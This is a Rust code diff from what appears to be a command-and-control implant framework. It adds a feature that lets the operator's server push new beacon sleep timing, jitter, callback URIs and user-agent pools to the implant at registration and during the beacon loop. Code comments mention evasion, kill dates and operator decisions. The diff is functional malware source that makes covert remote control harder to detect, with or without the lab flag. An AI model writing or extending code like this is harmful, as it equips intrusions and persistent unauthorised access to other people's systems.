@@ -2,7 +2,7 @@ use abraham_common::crypto::{self, ClientHello, Session};
 use abraham_common::frame::open_frames;
 use abraham_common::http::{read_response, write_request, HDR_HANDSHAKE};
 use abraham_common::message::{
-    self, msg, Chunk, Message, RegisterInfo, Task, TaskBody, TaskResult,
+    self, msg, Chunk, ConfigUpdate, Message, RegisterInfo, Task, TaskBody, TaskResult,
 };
 use abraham_common::profile::Profile;
 use ed25519_dalek::VerifyingKey;
@@ -238,6 +238,32 @@ struct Timing {
     jitter: f32,
 }
 
+/// ABR-T037: applies a server-driven configuration update in place.
+/// Timing takes effect on the next sleep; a UA pool re-picks once
+/// (stable per change, browsers do not rotate mid-session); URIs
+/// replace the pool the transport draws from. Kill date and gates are
+/// deliberately NOT server-configurable (operator decision 2026-09-14).
+fn apply_config<S>(
+    conn: &mut HttpConn<S>,
+    profile: &mut Profile,
+    timing: &mut Timing,
+    update: &ConfigUpdate,
+) {
+    if update.sleep_secs != ConfigUpdate::KEEP_SLEEP_SECS {
+        timing.secs = update.sleep_secs;
+    }
+    if update.jitter != ConfigUpdate::KEEP_JITTER && (0.0..=1.0).contains(&update.jitter) {
+        timing.jitter = update.jitter;
+    }
+    if !update.uris.is_empty() {
+        profile.uris = update.uris.clone();
+    }
+    if !update.user_agents.is_empty() {
+        profile.user_agents = update.user_agents.clone();
+        conn.user_agent = profile.pick_user_agent().to_string();
+    }
+}
+
 fn jittered(secs: u64, jitter: f32) -> Duration {
     let factor = 1.0 + jitter * (2.0 * rand::random::<f32>() - 1.0);
     let wait = (secs as f32 * factor).max(0.5) as u64;
@@ -334,9 +360,9 @@ async fn main() -> anyhow::Result<()> {
         None => None,
     };
 
-    let profile = config.profile.clone();
+    let mut profile = config.profile.clone();
     #[cfg(feature = "lab-args")]
-    let profile = {
+    let mut profile = {
         let mut profile = profile;
         if let Some(ua) = arg_opt("--ua") {
             profile.user_agent = ua;
@@ -425,7 +451,7 @@ async fn main() -> anyhow::Result<()> {
         match run(
             &config.servers[server_idx],
             &identity,
-            &profile,
+            &mut profile,
             pin,
             &evasion,
             &mut beacon,
@@ -507,7 +533,7 @@ fn resolve_config() -> anyhow::Result<Config> {
 async fn run(
     addr: &str,
     identity: &VerifyingKey,
-    profile: &Profile,
+    profile: &mut Profile,
     pin: Option<[u8; 32]>,
     evasion: &evasion::Evasion,
     beacon: &mut Beacon,
@@ -572,8 +598,21 @@ async fn run(
     );
 
     let (mt, body) = Message::Register(collect_info(beacon.token)).encode();
-    conn.post_frame(profile.pick_uri(), &mut session, mt, &body)
+    let register_frames = conn
+        .post_frame(profile.pick_uri(), &mut session, mt, &body)
         .await?;
+    // ABR-T037: the server resolves this implant's configuration rule
+    // context at REGISTER and rides the update in the response — apply
+    // it before the first sleep so the very first beacon already runs
+    // with the operator's timing.
+    for (msg_type, payload) in &register_frames {
+        if *msg_type == msg::CONFIG {
+            if let Message::Config(update) = Message::decode(*msg_type, payload)? {
+                apply_config(&mut conn, profile, &mut beacon.timing, &update);
+                note!("[*] config applied (epoch {})", update.epoch);
+            }
+        }
+    }
     // Past REGISTER the beacon loop is live — a later failure is a
     // mid-session drop, not a startup failure, so backoff resets.
     *linked = true;
@@ -620,6 +659,10 @@ async fn run(
                         chunk,
                     )
                     .await?;
+                }
+                Message::Config(update) => {
+                    apply_config(&mut conn, profile, &mut beacon.timing, &update);
+                    note!("[*] config applied (epoch {})", update.epoch);
                 }
                 _ => {}
             }
